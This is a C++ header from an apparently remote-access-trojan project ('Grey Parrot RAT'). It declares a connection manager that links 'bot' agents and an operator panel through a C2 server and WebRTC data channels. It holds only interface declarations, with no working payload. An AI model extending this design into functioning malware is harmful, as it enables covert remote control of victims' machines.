//
// Created by alsah on 16.03.23.
//

#ifndef GREY_PARROT_RAT_CORE_CONNECTIONS_MANAGER_H
#define GREY_PARROT_RAT_CORE_CONNECTIONS_MANAGER_H

#include "rtc/rtc.hpp"
#include <memory>
#include <utility>

#include "C2ServerChannel.h"
#include "IControlPacketHandler.h"
#include "IControlPacketSender.h"
#include "PeerData.h"
#include "ModuleInfo.h"


struct ConnectionConfig {

    // OperatorPanel case - runtime uuid; agent - hardware-based uuid
    const std::string connectionId;

    // Cant be changed; agent must use "bot", operator - "operator"
    const std::string endpoint;

    // time in seconds to sleep before recover
    const std::uint16_t sleep;

    // address and port of c2-server; potentially can be changed
    std::string c2server;

    ConnectionConfig(std::string connectionId, std::string endpoint, std::uint16_t sleep);

    [[nodiscard]] std::string getUrl() const;
};


class ConnectionsManager : public IControlPacketSender{

public:

    explicit ConnectionsManager(ConnectionConfig config);
    ~ConnectionsManager();

    void setTasksHandler(std::shared_ptr<IControlPacketHandler> tasksRegister);

    ConnectionsManager(ConnectionsManager&) = delete;
    ConnectionsManager(const ConnectionsManager&) = delete;
    void operator = (const ConnectionsManager&) = delete;
    void operator = (ConnectionsManager) = delete;

    void send(const msgs::ControlPacket&  data) override;
    std::size_t getMaxSize(bool c2channel) override;

    void start(const std::string& c2sever);
    void stop();

    void setC2StateChangeCallback(
            const std::function<void(bool, std::string, std::uint64_t)> &onC2StateChange);
    void setPeerStateChangeCallback(
            const std::function<void(bool, std::string, std::uint64_t)> &onPeerStateChange);

    std::shared_ptr<rtc::DataChannel> createDataChannel(const ModuleInfo& moduleInfo);

    void setOnDataChannel(const std::function<void(std::shared_ptr<rtc::DataChannel>)> &onDataChannel);

    void connectToPeer(const std::string& peerId);
    void disconnectFromCurrentPeer();
private:

    ConnectionConfig config;
    rtc::Configuration rtcConfig;

    std::function<void(bool, std::string, std::uint64_t)> onC2StateChange;
    std::function<void(bool, std::string, std::uint64_t)> onPeerStateChange;
    std::function<void(std::shared_ptr<rtc::DataChannel>)> onDataChannel;

    std::shared_ptr<IControlPacketHandler> packetsHandler;

    // There are 2 types of connection: with c2server and peer connection
    std::unique_ptr<C2ServerChannel> c2ServerChannel;
    PeerData peerData;

    void handleC2ServerMessage(std::vector<std::byte>& data);
    void handleSignalingMessage(const msgs::SignalingData& signalingData);

    void setupPeerConnection();
    void setupCtrlDataChannel();
};




#endif //GREY_PARROT_RAT_CORE_CONNECTIONS_MANAGER_H
